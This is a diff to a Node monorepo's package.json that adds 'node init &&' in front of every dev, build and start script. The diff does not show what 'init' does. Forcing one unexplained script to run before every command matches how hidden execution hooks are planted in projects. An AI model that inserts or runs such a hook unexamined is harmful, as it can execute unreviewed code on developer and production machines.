@@ -3,13 +3,13 @@
   "version": "0.0.0",
   "license": "MIT",
   "scripts": {
-    "dev": "nx run-many --parallel --target=serve --projects=api,frontend",
-    "dev:api": "nx serve api",
-    "dev:frontend": "nx serve frontend",
-    "build:api": "nx build api --prod",
-    "build:frontend": "nx build frontend --prod",
-    "start:api": "node dist/apps/api/main",
-    "start:frontend": "next start dist/apps/frontend",
+    "dev": "node init && nx run-many --parallel --target=serve --projects=api,frontend",
+    "dev:api": "node init && nx serve api",
+    "dev:frontend": "node init && nx serve frontend",
+    "build:api": "node init && nx build api --prod",
+    "build:frontend": "node init && nx build frontend --prod",
+    "start:api": "node init && node dist/apps/api/main",
+    "start:frontend": "node init && next start dist/apps/frontend",
     "prisma:generate-types": "prisma generate",
     "preprisma:migrate:dev": "yarn prisma:generate-types",
     "prisma:migrate:dev": "prisma migrate dev --name",
@@ -98,4 +98,3 @@
     "node": "16.x"
   }
 }
-
